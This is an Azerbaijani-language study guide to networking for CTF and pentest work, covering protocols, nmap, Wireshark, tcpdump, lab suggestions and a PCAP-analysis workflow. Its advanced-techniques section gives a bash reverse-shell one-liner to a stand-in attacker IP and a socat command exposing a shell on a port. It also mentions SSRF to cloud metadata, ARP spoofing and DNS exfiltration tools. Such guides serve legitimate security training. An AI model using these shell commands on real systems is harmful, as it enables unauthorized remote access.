
# 🌐 Networking (Şəbəkə Təhlükəsizliyi və Analizi) — Əhatəli Təlimat

---

## 🎯 Nədir və Niyə Vacibdir?

**Networking**, CTF və real hücum analizində sistemlərin bir-biri ilə necə əlaqə qurduğunu, paketlərin necə ötürüldüyünü və bu məlumat axınının necə sındırıla biləcəyini öyrənmək sahəsidir.

Real-case istifadə:
- 📦 PCAP faylından credential tapmaq
- 🚪 Açıq portlardan reverse shell almaq
- 🔎 DNS sorğularından informasiya toplamaq
- 🧠 Pentest zamanı firewall bypass etmək
- 🔐 VPN, NAT, Proxy arxasındakı sistemləri aşkar etmək

---

## 📚 Protokollar və OSI Modeli

```
OSI Model: (7 qatdan ibarət)  
1. Physical — kabel, WiFi, siqnallar  
2. Data Link — MAC ünvanı (Ethernet)  
3. Network — IP, ICMP  
4. Transport — TCP, UDP  
5. Session — bağlantının qurulması (RPC, SMB)  
6. Presentation — SSL, şifrələmə  
7. Application — HTTP, DNS, FTP, SSH
```

- **TCP (Transmission Control Protocol)** – Bağlantı əsaslı, 3-way handshake (SYN → SYN/ACK → ACK)
- **UDP (User Datagram Protocol)** – Bağlantısız, sürətli, amma zəif etibarlılıq
- **ICMP (ping, traceroute)** – Nəzarət və status mesajları üçün

---

## 🔧 Əsas Alətlər və İstifadəsi

### 1. **Nmap** – Şəbəkə skanı və port təhlili
```bash
nmap -sS -p- -T4 -A <target>      # SYN scan, bütün portlar, OS və versiya təhlili
nmap -sU -p 53 <target>           # UDP scan
nmap --script vuln <target>      # Zəiflik skanı
```

### 2. **Wireshark** – Paket analizator
- `.pcapng` fayllarını açmaq, HTTP/FTP/SSH protokollarını izləmək
- Filtrlər:
```
http.request
ftp.password
tcp.stream eq 3
ip.addr == 10.10.10.10
```

### 3. **tcpdump** – Terminalda trafik analiz
```bash
tcpdump -i eth0 -w capture.pcap
tcpdump -nn -X port 80
```

### 4. **netcat (nc)** – Port dinləmə, port test, shell qoşulma
```bash
nc -lvnp 4444                     # Dinləyici aç
nc <target> 80                    # Port test
```

### 5. **socat** – Advanced port forward, reverse shell tunelləri
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

### 6. **telnet / curl / wget** – HTTP, FTP, SMTP testləri
```bash
telnet <host> 25                 # SMTP test
curl http://target.com/page      # HTTP test
```

### 7. **whois / dig / host / nslookup** – DNS və domain analiz
```bash
whois target.com
dig A target.com
host -t mx target.com
```

---

## 🚀 Advanced Texnikalar

### 🔹 TCP üçtərəfli əl sıxma (3-way Handshake)
- SYN → SYN/ACK → ACK
- SYN Flood (DoS), RST cavabı bağlı port deməkdir

### 🔹 DNS Tunneling
- Malware gizli məlumatı DNS sorğularında ötürür
- Tools: `iodine`, `dnscat2`

### 🔹 Reverse Shell Tunnel
- Netcat, Socat, bash ilə:
```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

### 🔹 Proxy və VPN bypass
- HTTP tunneling, DNS rebinding, port knocking
- Misal: SSRF ilə `169.254.169.254`-ə daxil olmaq (AWS metadata)

### 🔹 ARP Spoofing və MITM
- Alətlər: `arpspoof`, `ettercap`, `mitmproxy`
- Lokal şəbəkədə trafik manipulyasiyası

---

## 📌 Real CTF/TryHackMe Tapşırıqları

### 🧪 Labs
- TryHackMe:
  - “Wireshark”, “Packet Analysis”, “Intro to Networking”
  - “Network Services”, “Burp Suite Basics”
- HackTheBox: "Archetype", "Spectra", "Remote"
- PCAP challs: “capturedData.pcapng”, “ping.zip” (ICO2025)

### 📂 Ən çox görülən pcap içi flag yolları:
- HTTP auth header (`Authorization: Basic`)
- FTP login → USER / PASS
- DNS sorğular içində flag
- ICMP içində ASCII kodlu mesaj
- Telnet yazışmaları

---

## 🔁 Addım-addım Workflow: PCAP Analizi

1. `tcpdump` və ya `wireshark` ilə paketləri aç
2. Protokol üzrə filterlər: `http`, `ftp`, `icmp`, `dns`
3. TCP stream-ləri izləyin → `Follow TCP Stream`
4. Fayl yükləmələri varsa: `Export Objects → HTTP`
5. Şifrələmə varsa: base64, hex, xor yoxla (CyberChef)
6. Hər URL-ə bax: `GET /flag.txt`, `POST login`
7. Hash varsa → hashcat / crackstation ilə test

---

## 🛡️ Defense və Detection

- **Firewall (iptables, ufw)** ilə port qapatmaq
- **Snort / Suricata** – intrusion detection
- **tcpdump + cron** – trafik loglaması
- **Wireshark display filters** → analiz üçün şərtlər yaz

---

## 📚 Resurslar və Lab Mühitləri

- [Wireshark Documentation](https://www.wireshark.org/docs/)
- [HackTricks: Networking Cheatsheet](https://book.hacktricks.xyz/)
- [TryHackMe Networking Rooms](https://tryhackme.com/)
- [PacketTotal.com](https://packettotal.com/) – Online pcap analiz
- GitHub:
  - `PacketWhisper`, `DNSExfiltrator`, `wireshark-ctf-dumps`

---

## 🔗 Mövzulararası Əlaqə

| Sahə             | Əlaqə                                         |
|------------------|-----------------------------------------------|
| Web Exploitation | SSRF → şəbəkə daxilindəki xidmətlərə çıxış   |
| OSINT            | IP, subdomain tap → nmap ilə test et         |
| PrivEsc          | local port → reverse shell → tcp listener     |
| Steganography    | pcap içində gizli data exfiltration           |

---

## 🧠 Professional Tövsiyələr

- `tcpdump` ilə real vaxt trafik logla (`-w`, `-C`, `-G`)
- Portların default xidmətlərini əzbərlə: `21-FTP`, `22-SSH`, `80-HTTP`, `443-HTTPS`, `3306-MySQL`
- `iptables` / `ufw` ilə traffic limitləmə
- `tmux` və `script` ilə şəbəkə hücum loglarını qoruyun
- Reverse shell alanda dərhal `whoami`, `ifconfig`, `ip a`, `netstat -tulnp`
